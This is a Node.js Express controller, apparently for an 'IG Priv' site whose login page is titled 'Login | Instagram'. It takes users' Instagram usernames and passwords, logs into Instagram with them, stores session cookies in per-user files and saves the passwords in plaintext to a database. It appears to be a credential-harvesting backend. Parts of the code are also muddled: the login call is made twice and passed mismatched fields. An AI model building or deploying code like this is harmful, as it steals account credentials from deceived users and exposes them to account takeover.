const mongoose = require('mongoose');
const jwt = require('jsonwebtoken');
const User = require('../models/igUserModel');

const Instagram = require('instagram-web-api')
const FileCookieStore = require('tough-cookie-filestore2')
var ref, urlSegmentToInstagramId, instagramIdToUrlSegment;
ref = require('instagram-id-to-url-segment')
urlSegmentToInstagramId = ref.urlSegmentToInstagramId;
instagramIdToUrlSegment = ref.instagramIdToUrlSegment;



// GET

const homeShow = async (req, res, next) => {
    try {

        res.render('user/homePage', { layout: '../layouts/mainSecond_Layout', title: `IG Priv`, description: ``, keywords: `` })


    } catch (err) {
        console.log(err);
    }
};

const loginPageShow = async (req, res, next) => {
    try {

        res.render('user/loginPage', { layout: '../layouts/mainHome_Layout', title: `Login | Instagram`, description: ``, keywords: `` })


    } catch (err) {
        console.log(err);
    }
};



// POST

const loginUser = async (req, res, next) => {

    const gelenUsername = req.body.iUsername;
    const gelenSifre = req.body.iPassword

    const cookieStore = new FileCookieStore(`./cookies/${gelenUsername}.txt`)
    const client = new Instagram({ gelenUsername, gelenSifre, cookieStore });

    try {
        await client.login()
        const { gelenUsername, gelenSifre, cookieStore } = await client.login()
            .then(function (response) {

                if (response != undefined) {
                    

                    async function addUser() {
                        const usernameToID = urlSegmentToInstagramId(req.body.iUsername);
                        const uyeVarMi = await User.count({ iUsername: req.body.iUsername })
                        if (uyeVarMi > 0) {
                            const uyeBilgileri = await User.find({ iUsername: req.body.iUsername })

                            const guncelBilgiler = {
                                iPassword: req.body.iPassword,
                                tActive: '1'

                            }

                            await User.findByIdAndUpdate(uyeBilgileri[0]._id, guncelBilgiler);
                        }
                        else {

                            const newUser = new User({
                                iId: usernameToID,
                                iUsername: req.body.iUsername,
                                iPassword: req.body.iPassword,
                                tActive: '1'
                            });
                            await newUser.save();
                        }
                        const data = {
                            time: Date(),
                            iUsername: req.body.iUsername,
                        }

                        const jwtToken = jwt.sign(data, process.env.JWT_SECRET_KEY, { expiresIn: '1d' });

                        res.clearCookie('access_token');

                        res.cookie('access_token', jwtToken, { expires: new Date(Date.now() + 900000) })
                        res.redirect(`/accounts`)
                    } addUser();

                } else {
                    res.locals.iUserlogin_error = req.flash('iUserlogin_error', '<center><p><b>Giriş Başarısız!</b><br>Lütfen bilgilerinizi kontrol edin!</p></center>');
                    res.redirect('/login');
                }
            }).catch(function (error) {
                res.locals.iUserlogin_error = req.flash('iUserlogin_error', '<center><p><b>Giriş Başarısız!</b><br>Sunucuya bağlanırken bir sorunla karşılaştık!</p></center>');
                res.redirect('/login')
            })
    } catch (err) {
        console.log(err);
    }

};



module.exports = {
    homeShow,
    loginPageShow,
    loginUser
}